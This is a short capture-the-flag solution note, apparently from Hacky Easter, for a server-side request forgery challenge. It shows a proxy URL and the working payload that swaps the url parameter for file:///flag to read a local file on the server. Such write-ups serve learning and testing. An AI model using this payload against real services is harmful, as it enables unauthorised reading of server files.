# solution
- SSRF - server side request forgery
- note that requests are sent to URLs like
  - `http://ch.hackyeaster.com:2316/get?url=http://trek:1337/trek`
- manipulate url parameter to read flag locally
  - `http://ch.hackyeaster.com:2316/get?url=file:///flag`